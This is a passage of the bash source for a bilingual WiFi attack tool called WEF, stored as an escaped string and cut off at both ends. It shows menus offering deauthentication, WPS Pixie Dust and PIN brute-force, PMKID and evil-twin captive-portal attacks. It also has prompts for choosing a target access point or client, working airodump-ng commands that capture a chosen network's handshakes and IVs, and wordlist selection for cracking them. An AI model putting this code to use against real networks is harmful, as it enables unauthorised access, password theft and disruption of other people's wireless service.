WIDS\\t[${yC}10${blueC}] Ataque HIRTE${endC}\"\n    echo -e \"${blueC}[${yC}3${blueC}] Ataque de autenticación\\t[${yC}11${blueC}] Ataque Caffe Latte${endC}\"\n    echo -e \"${blueC}[${yC}4${blueC}] Ataque Beacon Flood\\t\\t[${yC}12${blueC}] Ataque de falsa auth.${endC}\"\n    echo -e \"${blueC}[${yC}5${blueC}] Ataque TKIP${endC}\"\n    echo -e \"\\n${blueC}--------${yC}Ataques WPS${blueC}----------\\t----${yC}Ataques de Handshake${blueC}----${endC}\"\n    echo -e \"${blueC}[${yC}6${blueC}] Ataque Pixie Dust\\t\\t[${yC}13${blueC}] Ataque de captura WPA/2 (sin deauth)${endC}\"\n    echo -e \"${blueC}[${yC}7${blueC}] Ataque de fuerza bruta\\t[${yC}14${blueC}] Ataque PMKID${endC}\"\n    echo -e \"${blueC}[${yC}8${blueC}] Ataque de PIN nulo\\t\\t[${yC}15${blueC}] Modo Pwnagotchi${endC}\"\n  fi\n}\n\n# Commands help panel\nfunction commands_panel(){\n  if [ \"$lang\" == \"en\" ]; then\n    echo -e \"\\n   ${yC}COMMANDS:${endC}\"\n\n    echo -e \"\\n\\t${yC}NETWORK ADAPTER:${endC}\"\n    echo -e \"${blueC}\\t enable\\t\\t\\tenable monitor mode for especified network interface${endC}\"\n    echo -e \"${blueC}\\t disable\\t\\tdisable monitor mode and enable managed mode for especified network interface${endC}\"\n    echo -e \"${blueC}\\t mac\\t\\t\\tchange interface MAC with a custom or random address${endC}\"\n    echo -e \"${blueC}\\t check_vif\\t\\tcheck if your network adapter supports VIF (Virtual Interface)${endC}\"\n\n    echo -e \"\\n\\t${yC}ACCESS POINTS:${endC}\"\n    echo -e \"${blueC}\\t scan\\t\\t\\t\\tscan nearby access points${endC}\"\n    echo -e \"${blueC}\\t list_aps\\t\\t\\tlist already scanned APs${endC}\"\n    echo -e \"${blueC}\\t inhibit <bssid> <channel>\\tinhibit connections of an AP until you press Ctrl+C (deauth all clients)${endC}\"\n    echo -e \"${blueC}\\t graph <file.csv> <output.png>\\tcreate a graph (using airgraph-ng) of APs and its devices (especify an airodump-ng csv file)${endC}\"\n\n    echo -e \"\\n\\t${yC}HANDSHAKES:${endC}\"\n    echo -e \"${blueC}\\t check <file.cap>\\t\\t\\tcheck if given capture file contains at least one WPA or PMKID handshake${endC}\"\n    echo -e \"${blueC}\\t crack <file.cap> <wordlist.txt>\\tcrack given handshake with given wordlist using aircrack-ng${endC}\"\n    echo -e \"${blueC}\\t john <file.cap> <wordlist.txt>\\t\\tcrack given handshake with given wordlist using john the ripper${endC}\"\n    echo -e \"${blueC}\\t hashcat <file.cap> <wordlist.txt>\\tcrack given handshake with given wordlist using hashcat${endC}\"\n    echo -e \"${blueC}\\t convert <file.cap> <output.hc22000>\\tconvert given capture file to hashcat crackeable format\"\n\n    echo -e \"\\n\\t${yC}INFORMATIVE:${endC}\"\n    echo -e \"${blueC}\\t identify <mac>\\t\\tprint vendor of given MAC address (i.e. D0:37:45:37:B5:6D -> TP-LINK)\"\n    echo -e \"${blueC}\\t info\\t\\t\\tshow info about the network adapter interface${endC}\"\n    echo -e \"${blueC}\\t panel\\t\\t\\tdisplay attack options panel${endC}\"\n    echo -e \"${blueC}\\t attacks\\t\\tshow info about the available attacks${endC}\"\n    echo -e \"${blueC}\\t chipsets\\t\\tlist chipsets that support monitor mode${endC}\"\n\n    echo -e \"\\n\\t${yC}CONFIG:${endC}\"\n    echo -e \"${blueC}\\t update\\t\\t\\tcheck if an update is available and ask you to install it${endC}\"\n    echo -e \"${blueC}\\t edit\\t\\t\\tedit config file using default text editor (re-execute tool to apply changes)${endC}\"\n    echo -e \"${blueC}\\t clear/cls\\t\\tclear the screen${endC}\"\n    echo -e \"${blueC}\\t version\\t\\tprint the info about the version of wef${endC}\"\n    echo -e \"${blueC}\\t exit/quit\\t\\texit the framework${endC}\"\n    echo -e \"${blueC}\\t help/?\\t\\t\\tprint this help panel${endC}\"\n  elif [ \"$lang\" == \"es\" ]; then\n    echo -e \"\\n   ${yC}COMANDOS:${endC}\"\n\n    echo -e \"\\n\\t${yC}ADAPTADOR DE RED:${endC}\"\n    echo -e \"${blueC}\\t enable\\t\\t\\thabilita el modo monitor en la interfaz de red especificada${endC}\"\n    echo -e \"${blueC}\\t disable\\t\\tdesactiva el modo monitor y habilita el modo managed en la interfaz de red especificada${endC}\"\n    echo -e \"${blueC}\\t mac\\t\\t\\tcambia la MAC de la interfaz por una dirección concreta o una aleatoria${endC}\"\n    echo -e \"${blueC}\\t check_vif\\t\\tcomprueba si tu adaptador de red soporta VIF (Interfaz Virtual)${endC}\"\n\n    echo -e \"\\n\\t${yC}PUNTOS DE ACCESO:${endC}\"\n    echo -e \"${blueC}\\t scan\\t\\t\\t\\tescanea los puntos de acceso cercanos${endC}\"\n    echo -e \"${blueC}\\t list_aps\\t\\t\\tmuestra la lista de los APs escaneados${endC}\"\n    echo -e \"${blueC}\\t inhibit <bssid> <channel>\\tinhibe las conexiones de un AP hasta que presiones Ctrl+C (deautentica a todos los clientes)${endC}\"\n    echo -e \"${blueC}\\t graph <file.csv> <output.png>\\tcrea un gráfico (usando airgraph-ng) sobre los APs y sus clientes (especifica un archivo csv de airodump-ng)${endC}\"\n\n    echo -e \"\\n\\t${yC}HANDSHAKES:${endC}\"\n    echo -e \"${blueC}\\t check <file.cap>\\t\\t\\tcomprueba si el archivo especificado contiene al menos un handshake WPA o PMKID${endC}\"\n    echo -e \"${blueC}\\t crack <file.cap> <wordlist.txt>\\tcrackea el handshake dado con la wordlist especificada usando aircrack-ng${endC}\"\n    echo -e \"${blueC}\\t john <file.cap> <wordlist.txt>\\t\\tcrackea el handshake dado con la wordlist especificada usando john the ripper${endC}\"\n    echo -e \"${blueC}\\t hashcat <file.cap> <wordlist.txt>\\tcrackea el handshake dado con la wordlist especificada usando hashcat${endC}\"\n    echo -e \"${blueC}\\t convert <file.cap> <output.hc22000>\\tconvierte el archivo de captura a un formato crackeable con hashcat\"\n\n    echo -e \"\\n\\t${yC}INFORMATIVO:${endC}\"\n    echo -e \"${blueC}\\t identify <mac>\\t\\tmuestra el vendor de la dirección MAC proporcionada (e.g. D0:37:45:37:B5:6D -> TP-LINK)\"\n    echo -e \"${blueC}\\t info\\t\\t\\tmuestra información sobre la interfaz del adaptador de red${endC}\"\n    echo -e \"${blueC}\\t panel\\t\\t\\tmuestra el panel con las opciones de los ataques${endC}\"\n    echo -e \"${blueC}\\t attacks\\t\\tmuestra info sobre los ataques disponibles${endC}\"\n    echo -e \"${blueC}\\t chipsets\\t\\tlista los chipsets que soportan modo monitor${endC}\"\n\n    echo -e \"\\n\\t${yC}CONFIG:${endC}\"\n    echo -e \"${blueC}\\t update\\t\\t\\tcomprueba si hay alguna actualización disponible y la instala${endC}\"\n    echo -e \"${blueC}\\t edit\\t\\t\\tedita el archivo de config usando el editor de texto predeterminado (reejecuta WEF para aplicar los cambios)${endC}\"\n    echo -e \"${blueC}\\t clear/cls\\t\\tlimpia la pantalla${endC}\"\n    echo -e \"${blueC}\\t version\\t\\timprime la versión actual de la herramienta${endC}\"\n    echo -e \"${blueC}\\t exit/quit\\t\\tsalir del framework${endC}\"\n    echo -e \"${blueC}\\t help/?\\t\\t\\timprime este panel de ayuda${endC}\"\n  fi\n}\n\nfunction evil_twin_panel() {\n  if [ \"$lang\" == \"en\" ]; then\n    color_output \"1\" \"Rogue AP + Captive Portal\"\n    color_output \"2\" \"Rogue AP + Captive Portal + DoS\"\n    color_output \"3\" \"Rogue AP + Captive Portal + WiFi Enterprise\"\n    color_output \"4\" \"Rogue AP + Captive Portal + WiFi Enterprise + DoS\"\n  else\n    color_output \"1\" \"Rogue AP + Portal Cautivo\"\n    color_output \"2\" \"Rogue AP + Portal Cautivo + DoS\"\n    color_output \"3\" \"Rogue AP + Portal Cautivo + WiFi Enterprise\"\n    color_output \"4\" \"Rogue AP + Portal Cautivo + WiFi Enterprise + DoS\"\n  fi\n}\n\n# Chipsets for monitor mode\nfunction chipsets_panel(){\n  echo -e \"\\n\\t${yC}Chipsets\"\n  echo -e \"\\t--------${blueC}\"\n  echo -e \"\\tRTL8812AU\"\n  echo -e \"\\tAR9271\"\n  echo -e \"\\tMT7610U\"\n  echo -e \"\\tMT7612U\"\n  echo -e \"\\tRTL8814U\"\n  echo -e \"\\tRTL8188EUS${endC}\"\n  color_output_ln \"*\" \"${netCard} chipset: ${yC}${chipset}${endC}\"\n}\n\n\n\n\n#\n# Auxiliar functions to ask data to user (ESSID, BSSID, attack time, frames to send...)\n#\n\nfunction ask_target(){\n  while true; do\n    if [ \"$lang\" == \"en\" ]; then\n      color_output_no_line \"*\" \"Introduce the number of the AP you want to attack: \" && read number\n    else\n      color_output_no_line \"*\" \"Introduce el número del AP que quieras atacar: \" && read number\n    fi\n\n    if [ ! \"$number\" ]; then\n      if [ \"$lang\" == \"en\" ]; then\n        echo -e \"${grayC}Introduce a valid number${endC}\"\n      else\n        echo -e \"${grayC}Introduce un número valido${endC}\"\n      fi\n      continue\n    elif [ \"$number\" == \"exit\" ] || [ \"$number\" == \"quit\" ]; then\n      ctrl_c\n    elif [ \"$number\" == \"back\" ]; then\n      break\n    elif [[ $number =~ ^[0-9]+$ ]]; then\n      break\n    else\n      if [ \"$lang\" == \"en\" ]; then\n        echo -e \"${grayC}Introduce a valid number${endC}\"\n      else\n        echo -e \"${grayC}Introduce un número valido${endC}\"\n      fi\n      continue\n    fi\n  done\n}\n\nfunction ask_target_client(){\n  if [ \"$lang\" == \"en\" ]; then\n    color_output_no_line \"*\" \"Introduce the number of the client you want to attack: \" && read client_number\n  else\n    color_output_no_line \"*\" \"Introduce el número del cliente que quieras atacar: \" && read client_number\n  fi\n\n  if [ \"${client_number}\" == \"exit\" ] || [ \"${client_number}\" == \"quit\" ]; then\n    ctrl_c\n  fi\n}\n\n# Ask for BSSID\nfunction ask_bssid(){\n  if [ \"$lang\" == \"en\" ]; then\n    color_output_no_line \"*\" \"Introduce BSSID of the target AP: \" && read ap_bssid\n  else\n    color_output_no_line \"*\" \"Introduce la BSSID del AP objetivo: \" && read ap_bssid\n  fi\n\n  if [ \"${ap_bssid}\" == \"exit\" ] || [ \"${ap_bssid}\" == \"quit\" ]; then\n    ctrl_c\n  fi\n}\n\n# Ask for attack duration\nfunction ask_time(){\n  if [ \"$lang\" == \"en\" ]; then\n    color_output_no_line \"*\" \"Introduce attack duration (default=${default}): \" && read attack_time\n  else\n    color_output_no_line \"*\" \"Introduce la duración del ataque (por defecto=${default}): \" && read attack_time\n  fi\n\n  if [ \"${attack_time}\" == \"exit\" ] || [ \"${attack_time}\" == \"quit\" ]; then\n    ctrl_c\n  fi\n\n  if [ ! \"${attack_time}\" ]; then\n    attack_time=\"${default}\"\n  fi\n\n  if [[ ${attack_time} =~ [^0-9ms] ]] && [ \"${attack_time}\" != \"back\" ]; then\n    if [ \"$lang\" == \"en\" ]; then\n      color_output \"X\" \"Invalid attack duration!\"\n    else\n      color_output \"X\" \"Duración inválida!\"\n    fi\n\n    ask_time\n  fi\n\n}\n\n# Ask amount of deuth frames to send\nfunction ask_frames(){\n  if [ \"$lang\" == \"en\" ]; then\n    color_output_no_line \"*\" \"Amount of deauth frames to send (default=${default}): \" && read frames_to_send\n  else\n    color_output_no_line \"*\" \"Cantidad de paquetes de deautenticación a enviar (por defecto=${default}): \" && read frames_to_send\n  fi\n\n  if [ ! \"$frames_to_send\" ]; then\n    frames_to_send=\"${default}\"\n  fi\n\n  if [ \"$frames_to_send\" == \"exit\" ] || [ \"$frames_to_send\" == \"quit\" ]; then\n    ctrl_c\n  fi\n}\n\n# Ask user to capture handshakes\nfunction ask_to_capture_handshakes(){\n  if [ \"$lang\" == \"en\" ]; then\n    echo -ne \"${blueC}[${yC}*${blueC}] Do you want to capture handshakes? (default=yes) (${yC}yes${blueC}/${yC}no${blueC}): ${endC}\" && read c_hand\n  else\n    echo -ne \"${blueC}[${yC}*${blueC}] ¿Quieres capturar los handshakes? (por defecto=sí) (${yC}si${blueC}/${yC}no${blueC}): ${endC}\" && read c_hand\n  fi\n\n  if [ \"$c_hand\" == \"exit\" ] || [ \"$c_hand\" == \"quit\" ]; then\n    ctrl_c\n  fi\n\n  # Check user input to start airodump or not\n  if [ \"$c_hand\" == \"y\" ] || [ \"$c_hand\" == \"yes\" ] || [ \"$c_hand\" == \"s\" ] || [ \"$c_hand\" == \"si\" ] || [ ! \"$c_hand\" ]; then\n    if [ \"$airmon_check_kill\" == \"true\" ]; then\n      if [ \"$lang\" == \"en\" ]; then\n        echo -e \"${grayC}Do not close airodump-ng window, it will be closed once the attack ends${endC}\"\n      else\n        echo -e \"${grayC}No cierres la ventana de airodump-ng, se cerrará una vez que el ataque termine${endC}\"\n      fi\n    else\n      if [ \"$lang\" == \"en\" ]; then\n        echo -e \"${grayC}Airodump-ng launched in background, it will be closed once the attack ends${endC}\"\n      else\n        echo -e \"${grayC}Airodump-ng iniciado en background, se cerrará una vez que el ataque termine${endC}\"\n      fi\n    fi; sleep 0.2\n\n    c_h=\"true\"\n    cap_name=$(date +\"%Y-%m-%d-%H-%M-%S\")\n\n    if [ ! -d \"/usr/share/wef/main/captures\" ]; then\n      mkdir \"/usr/share/wef/main/captures\" 2>/dev/null\n    fi\n\n    if [ \"$airmon_check_kill\" == \"true\" ]; then\n      xterm -hold -bg \"#000000\" -fg \"#FFFFFF\" -geometry 107x36-10+10 -T \"Airodump-ng\" -xrm 'XTerm*selectToClipboard: true' -e \"airodump-ng -c ${channel} -w \\\"/usr/share/wef/main/captures/${ap_dir}/${cap_name}\\\" --bssid \\\"${ap_bssid}\\\" ${netCard}\" 2>/dev/null &\n    else\n      airodump-ng -c ${channel} -w \"/usr/share/wef/main/captures/${ap_dir}/${cap_name}\" --bssid \"${ap_bssid}\" ${netCard} &>/dev/null &\n    fi\n\n    airodump_PID=$!\n  else\n    c_h=\"false\"\n  fi\n}\n\n# Ask user to capture IVs\nfunction ask_to_capture_ivs(){\n  if [ \"$lang\" == \"en\" ]; then\n    echo -ne \"${blueC}[${yC}*${blueC}] Do you want to capture IVs? (default=yes) (${yC}yes${blueC}/${yC}no${blueC}): ${endC}\" && read c_ivs\n  else\n    echo -ne \"${blueC}[${yC}*${blueC}] ¿Quieres capturar los IVs? (por defecto=sí) (${yC}si${blueC}/${yC}no${blueC}): ${endC}\" && read c_ivs\n  fi\n\n  if [ \"$c_ivs\" == \"exit\" ] || [ \"$c_ivs\" == \"quit\" ]; then\n    ctrl_c\n  fi\n\n  # Check user input to start airodump or not\n  if [ \"$c_ivs\" == \"y\" ] || [ \"$c_ivs\" == \"yes\" ] || [ \"$c_ivs\" == \"s\" ] || [ \"$c_ivs\" == \"si\" ] || [ ! \"$c_ivs\" ]; then\n    if [ \"$lang\" == \"en\" ]; then\n      echo -e \"${blueC}Do not close airodump-ng window, it will be closed automatically${endC}\"\n    else\n      echo -e \"${blueC}No cierres la ventana de airodump-ng, se cerrará automaticamente${endC}\"\n    fi; sleep 0.2\n\n    c_i=\"true\"\n    cap_name=$(date +\"%Y-%m-%d-%H-%M-%S\")\n\n    if [ ! -d \"/usr/share/wef/main/captures\" ]; then\n      mkdir \"/usr/share/wef/main/captures\"\n    fi\n\n    if [ \"$airmon_check_kill\" == \"true\" ]; then\n      xterm -hold -bg \"#000000\" -fg \"#FFFFFF\" -geometry 107x36-10+10 -T \"Airodump-ng\" -xrm 'XTerm*selectToClipboard: true' -e \"airodump-ng -c ${channel} -w \\\"/usr/share/wef/main/captures/${ap_dir}/${cap_name}\\\" --essid \\\"${essid}\\\" ${netCard}\" 2>/dev/null &\n    else\n      airodump-ng -c ${channel} -w \"/usr/share/wef/main/captures/${ap_dir}/${cap_name}\" --essid \"${essid}\" ${netCard} &\n    fi\n\n    airodump_PID=$!\n  else\n    c_i=\"false\"\n  fi\n}\n\n# Ask user for new interface name if it has changed when enabling monitor mode\nfunction ask_new_name(){\n  if [ \"$lang\" == \"en\" ]; then\n    echo -e \"${blueC}\\nIn new interfaces nomenclature, names change after enabling monitor mode${endC}\"\n    echo -ne \"${blueC}[${yC}*${blueC}] Interface name has changed, how is it called now?: ${endC}\" && read new_name\n  else\n    echo -e \"${blueC}\\nCon la nueva nomenclatura de las interfaces, los nombre cambian despues de activar el modo monitor${endC}\"\n    echo -ne \"${blueC}[${yC}*${blueC}] El nombre de la interfaz ha cambiado, ¿como se llama ahora?: ${endC}\" && read new_name\n  fi\n\n  if [ ! -d \"/sys/class/net/${new_name}\" ]; then\n    if [ \"$lang\" == \"en\" ]; then\n      color_output_ln \"X\" \"Especified interface does not exist!\"\n    else\n      color_output_ln \"X\" \"La interfaz especificada no existe!\"\n    fi\n    ask_new_name\n  fi\n\n  evilCard=${netCard}\n  netCard=${new_name}\n  ip link set \"${netCard}\" up 2>/dev/null; sleep 0.2\n}\n\n# Ask for AP BSSID if name is duplicated\nfunction ask_name_duplicate(){\n  cat /usr/share/wef/cache/wps_scan.txt | grep \"${essid}$\"\n  if [ \"$lang\" == \"en\" ]; then\n    color_output_no_line \"*\" \"Multiple APs found with that name, enter its BSSID: \" && read ap_bssid\n  else\n    color_output_no_line \"*\" \"Múltiples APs encontrados con ese nombre, introduce su BSSID: \" && read ap_bssid\n  fi\n\n  if [ \"$ap_bssid\" == \"exit\" ] || [ \"$ap_bssid\" == \"quit\" ]; then\n    ctrl_c\n  fi\n}\n\nfunction ask_to_crack_handshakes(){\n  if [ \"${c_h}\" == \"true\" ]; then\n    if [ \"$(check_handshake)\" -gt \"0\" ]; then\n      if [ \"$lang\" == \"en\" ]; then\n        echo -ne \"\\n${blueC}[${yC}*${blueC}] Do you want to crack WPA/WPA2 handshakes? This process will take a long time (${yC}yes${blueC}/${yC}no${blueC}): ${endC}\" && read crack_option\n      else\n        echo -ne \"\\n${blueC}[${yC}*${blueC}] ¿Quieres crackear los handshakes WPA/WPA2? Este proceso tardará bastante tiempo (${yC}si${blueC}/${yC}no${blueC}): ${endC}\" && read crack_option\n      fi\n    elif [ \"$(check_handshake)\" -le \"0\" ] && [ \"$(check_pmkid_handshake)\" == \"true\" ]; then\n      if [ \"$lang\" == \"en\" ]; then\n        echo -ne \"\\n${blueC}[${yC}*${blueC}] Do you want to crack PMKID handshakes? This process will take a long time (${yC}yes${blueC}/${yC}no${blueC}): ${endC}\" && read crack_option\n      else\n        echo -ne \"\\n${blueC}[${yC}*${blueC}] ¿Quieres crackear los handshakes PMKID? Este proceso tardará bastante tiempo (${yC}si${blueC}/${yC}no${blueC}): ${endC}\" && read crack_option\n      fi\n    fi\n  fi\n}\n\n# Ask the user to select a wordlist\nfunction ask_dict(){\n  if [ -d \"/usr/share/wef/main/wordlists/\" ] && [ -f \"/usr/share/wef/main/wordlists/rockyou.txt\" ] && [ -f \"/usr/share/wef/main/wordlists/probable-v2-wpa-top4800.txt\" ] && [ -f \"/usr/share/wef/main/wordlists/darkweb2017-top10000.txt\" ]; then\n    if [ \"$lang\" == \"en\" ]; then\n      color_output_ln \"+\" \"Available wordlists:\"\n      echo -e \"${blueC}If you want to use a custom dictionary enter its full path${endC}\"\n      echo -ne \"\\t\"; color_output_no_line \"1\" \"rockyou.txt\\n\"\n      echo -ne \"\\t\"; color_output_no_line \"2\" \"probable-v2-wpa-top4800.txt\\n\"\n      echo -ne \"\\t\"; color_output_no_line \"3\" \"darkweb2017-top10000.txt\\n\\n\"\n      color_output_no_line \"*\" \"Select a wordlist to use: \" && read dic_option\n    else\n      color_output_ln \"+\" \"Diccionarios disponibles:\"\n      echo -e \"${blueC}Si quieres usar un diccionario personalizado escribe su ruta completa${endC}\"\n      echo -ne \"\\t\"; color_output_no_line \"1\" \"rockyou.txt\\n\"\n      echo -ne \"\\t\"; color_output_no_line \"2\" \"probable-v2-wpa-top4800.txt\\n\"\n      echo -ne \"\\t\"; color_output_no_line \"3\" \"darkweb2017-top10000.txt\\n\\n\"\n      color_output_no_line \"*\" \"Selecciona un diccionario: \" && read dic_option\n    fi\n\n    if [ \"$dic_option\" == \"1\" ] || [ \"$dic_option\" == \"rockyou\" ] || [ \"$dic_option\" == \"rockyou.txt\" ]; then\n      wordlist_to_use=\"/usr/share/wef/main/wordlists/rockyou.txt\"\n\n    elif [ \"$dic_option\" == \"2\" ] || [ \"$dic_option\" == \"probable\" ] || [ \"$dic_option\" == \"probable-v2-wpa-top4800.txt\" ]; then\n      wordlist_to_use=\"/usr/share/wef/main/wordlists/probable-v2-wpa-top4800.txt\"\n\n    elif [ \"$dic_option\" == \"3\" ] || [ \"$dic_option\" == \"darkweb\" ] || [ \"$dic_option\" == \"darkweb2017-top10000.txt\" ]; then\n      wordlist_to_use=\"/usr/share/wef/main/wordlists/darkweb2017-top10000.txt\"\n\n    elif [ -f \"${dic_option}\" ]; then\n      wordlist_to_use=\"${dic_option}\"\n\n    elif [ \"$dic_option\" == \"exit\" ] || [ \"$dic_option\" == \"quit\" ]; then\n      ctrl_c\n\n    else\n      if [ \"$lang\" == \"en\" ]; then\n        echo -e \"${blueC}Especified wordlist does not exist! Selecting rockyou.txt by default${endC}\"\n      else\n        echo -e \"${blueC}El diccionario especificado no existe! Seleccionando rockyou.txt por defecto${endC}\"\n      fi\n      wordlist_to_use=\"/usr/share/wef/main/wordlists/rockyou.txt\"\n\n    fi\n  else\n    while true; do\n      if [ \"$lang\" == \"en\" ]; then\n        color_output_no_line \"*\" \"Path to wordlist used to crack handshakes: \" && read wordlist_to_use\n      else\n        color_output_no_line \"*\" \"Ruta del diccionario usado para crackear los handshakes: \" && read wordlist_to_use\n      fi\n\n      if [ \"$wordlist_to_use\" == \"exit\" ] || [ \"$wordlist_to_use\" == \"quit\" ]; then\n        ctrl_c\n      fi\n\n      if [ -f \"${wordlist_to_use}\" ]; then\n        break\n      else\n        if [ \"$lang\" == \"en\" ]; then\n          color_output \"X\" \"Wordlist not found\"\n        else\n          color_output \"X\" \"Diccionario no encontrado\"\n        fi\n      fi\n    done\n  fi\n}\n\n\n\n#\n# Extra auxiliary functions\n#\n\nfunction write_informative_log(){\n  if [ ! -d \"/usr/share/wef/main/logs\" ]; then\n    mkdir \"/usr/share/wef/main/logs\" 2>/dev/null\n  fi\n\n  if [ \"${ap_bssid}\" ] && [ \"${essid}\" ]; then\n    log_name=\"${essid}-${ap_bssid}\"\n  elif [ \"${ap_bssid}\" ] && [ ! \"${essid}\" ]; then\n    log_name=\"${ap_bssid}\"\n  fi\n\n  if [ ! -f \"/usr/share/wef/main/logs/${log_name}.log\" ]; then\n    touch \"/usr/share/wef/main/logs/${log_name}.log\"\n  fi\n\n  # Check empty essid\n  if [ ! \"${essid}\" ]; then\n    if [ \"$lang\" == \"en\" ]; then\n      essid=\"Not especified\"\n    else\n      essid=\"No especificado\"\n    fi\n  fi\n\n  # Check empty bssid\n  if [ ! \"${ap_bssid}\" ]; then\n    if [ \"$lang\" == \"en\" ]; then\n      ap_bssid=\"Not especified\"\n    else\n      ap_bssid=\"No especificado\"\n    fi\n  fi\n\n  # No channel\n  if [ ! \"${channel}\" ]; then\n    if [ \"$lang\" == \"en\" ]; then\n      channel=\"Not especified\"\n    else\n      channel=\"No especificado\"\n    fi\n  fi\n\n  # Duration not especified\n  if [ ! \"${attack_time}\" ]; then\n    if [ \"$lang\" == \"en\" ]; then\n      attack_time=\"Not especified\"\n    else\n      attack_time=\"No especificado\"\n    fi\n  fi\n\n  # Log file format\n  if [ \"$lang\" == \"en\" ]; then\n    echo -e \"[WEF] WiFi Exploitation Framework\n---------------------------------\nAttack date: ${actual_date}\nAttack type: ${type_of_attack}\nTarget access point: ${essid}\nBSSID: ${ap_bssid}\nAttack duration: ${attack_time}\nAP channel: ${channel}\n---------------------------------\\n\" >> \"/usr/share/wef/main/logs/${log_name}.log\" 2>/dev/null\n  else\n    echo -e \"[WEF] WiFi Exploitation Framework\n---------------------------------\nFecha del ataque: ${actual_date}\nTipo de ataque: ${type_of_attack}\nPunto de acceso objetivo: ${essid}\nBSSID: ${ap_bssid}\nDuración del ataque: ${attack_time}\nCanal del AP: ${channel}\n---------------------------------\\n\" >> \"/usr/share/wef/main/logs/${log_name}.log\" 2>/dev/null\n  fi\n}\n\nfunction parse_info(){\n  aps=\"$(cat /usr/share/wef/cache/airodump-01.csv | awk '/Station MAC/{exit} 1' | sed '/^[[:space:]]*$/d' | sed 's/# beacons/Beacons/' | sed 's/channel/Channel/' | cut --complement -f 2,3,11,12,13,15 -d, | column -t -s, | tail -n +2)\"\n  aps_length=\"$(echo \"${aps}\" | wc -l)\"\n\n  if [ -f \"/usr/share/wef/cache/airodump-01.csv\" ] && [[ $number -le $aps_length ]]; then\n    essid=$(cat /usr/share/wef/cache/airodump-01.csv | awk '/Station MAC/{exit} 1' | sed '/^[[:space:]]*$/d' | sed 's/# beacons/Beacons/' | sed 's/channel/Channel/' | cut --complement -f 2,3,11,12,13,15 -d, | tail -n +2 | sed \"${number}q;d\" | rev | cut -d \",\" -f1 | rev | sed 's/^[[:blank:]]*//')\n    channel=$(echo \"${aps}\" | sed \"${number}q;d\" | awk '{print $2}')\n    ap_bssid=$(echo \"${aps}\" | sed \"${number}q;d\" | awk '{print $1}')\n    actual_date=$(date | awk '{print $1 \" \" $2 \" \" $3 \" \" $4 \" \" $5}' FS=\" \")\n    cap_name=\"$(date +\"%Y-%m-%d-%H-%M-%S\")\"\n  fi\n}\n\nfunction parse_info_wps(){\n  channel=$(cat /usr/share/wef/cache/wps_scan.txt | grep \"${ap_bssid}\" | awk '{print $2}')\n  essid=\"$(cat /usr/share/wef/cache/wps_scan.txt | grep \"${ap_bssid}\" | awk '{print $NF}')\"\n  actual_date=$(date | awk '{print $1 \" \" $2 \" \" $3 \" \" $4 \" \" $5}' FS=\" \")\n}\n\n# Example: 00:C0:CA:B0:23:84\nfunction get_vendor_from_mac(){\n  mac_to_identify=\"$(echo \"${1}\" | tr '[:lower:]' '[:upper:]' | tr \"-\" \":\")\" # convert possible 00-C0-CA-B0-23-84 format to 00:C0:CA:B0:23:84\n  macs_info=\"$(cat /usr/share/wef/vendors.json)\"\n\n  mac_1=\"$(echo \"${mac_to_identify%?????????}\")\" # 00:C0:CA\n  vendor=\"$(echo \"${macs_info}\" | jq -r '.[] | select(.macPrefix == \"'\"${mac_1}\"'\") | .vendorName' 2>/dev/null)\"\n\n  if [ \"${vendor}\" ]; then\n    echo \"${vendor}\"\n  else\n    mac_2=\"$(echo \"${mac_to_identify%???????}\")\" # 00:C0:CA:B\n    vendor=\"$(echo \"${macs_info}\" | jq -r '.[] | select(.macPrefix == \"'\"${mac_2}\"'\") | .vendorName' 2>/dev/null)\"\n\n    if [ \"${vendor}\" ]; then\n      echo \"${vendor}\"\n    else\n      mac_3=\"$(echo \"${mac_to_identify%??????}\")\" # 00:C0:CA:B0\n      vendor=\"$(echo \"${macs_info}\" | jq -r '.[] | select(.macPrefix == \"'\"${mac_3}\"'\") | .vendorName' 2>/dev/null)\"\n\n      if [ \"${vendor}\" ]; then\n        echo \"${vendor}\"\n      else\n        echo \"unknown\"\n      fi\n    fi\n  fi\n}\n\nfunction print_chipset(){\n  if [ \"$(check_interface_mode)\" == \"monitor\" ]; then\n    good_output \"+\" \"Chipset: ${greenC}${chipset}\"\n  else\n    good_output \"+\" \"Chipset: ${grayC}${chipset}\"\n  fi\n}\n\nfunction check_vif(){\n  iw list | grep \"Supported interface modes\" -A 8 | grep \"AP/VLAN\"\n}\n\n# Check the interface mode\nfunction check_interface_mode(){\n  iw dev ${netCard} info 2>/dev/null | grep 'type' | awk '{print $2}'\n}\n\nfunction check_monitor_type(){\n  # Check if monitor mode was enabled using airmon-ng or iw\n  if [ \"$(echo \"${netCard}\" | grep \"mon\")\" ]; then\n    echo \"airmon\"\n  else\n    echo \"iw\"\n  fi\n}\n\nfunction check_dups(){\n  cat /usr/share/wef/cache/wps_scan.txt | grep \"${essid}$\"\n}\n\nfunction check_handshake(){\n  total_amount=$(aircrack-ng \"/usr/share/wef/main/captures/${ap_dir}/${cap_name}.cap\" 2>/dev/null | grep \"WPA\" | grep -oP '(?<=WPA \\().*(?=handshake)' | tr -d \" \")\n\n  if [ \"$total_amount\" == \"\" ]; then\n    echo 0\n  else\n    echo \"${total_amount}\"\n  fi\n}\n\nfunction check_pmkid_handshake(){\n  if [ \"$(echo \"1\" | aircrack-ng \"/usr/share/wef/main/captures/${ap_dir}/${cap_name}.cap\" 2>/dev/null | grep \"WPA\" | grep \"PMKID\")\" ]; then\n    echo \"true\"\n  else\n    echo \"false\"\n  fi\n}\n\nfunction check_target_pmkid_handshake(){\n  if [ \"$(echo \"1\" | aircrack-ng \"/usr/share/wef/main/captures/${ap_dir}/${cap_name}.cap\" 2>/dev/null | grep \"WPA\" | grep -i \"${ap_bssid}\" | grep \"PMKID\")\" ]; then\n    echo \"true\"\n  else\n    echo \"false\"\n  fi\n}\n\nfunction check_handshakes_in_file(){\n  total_amount=$(echo \"1\" | aircrack-ng \"${1}\" 2>/dev/null | grep \"WPA\" | grep -oP '(?<=WPA \\().*(?=handshake)' | tr -d \" \")\n  \n  if [ \"$total_amount\" == \"\" ]; then\n    echo 0\n  else\n    echo \"${total_amount}\"\n  fi\n}\n\nfunction check_target_handshakes_in_file(){\n  total_amount=$(echo \"1\" | aircrack-ng \"${1}\" 2>/dev/null | grep \"WPA\" | grep -i \"${ap_bssid}\" | grep -oP '(?<=WPA \\().*(?=handshake)' | tr -d \" \")\n  \n  if [ \"$total_amount\" == \"\" ]; then\n    echo 0\n  else\n    echo \"${total_amount}\"\n  fi\n}\n\n# Check if at least 1 handshake has been captured\nfunction check_captured_handshakes(){\n  if [ \"$(check_handshake)\" -gt \"0\" ] && [ 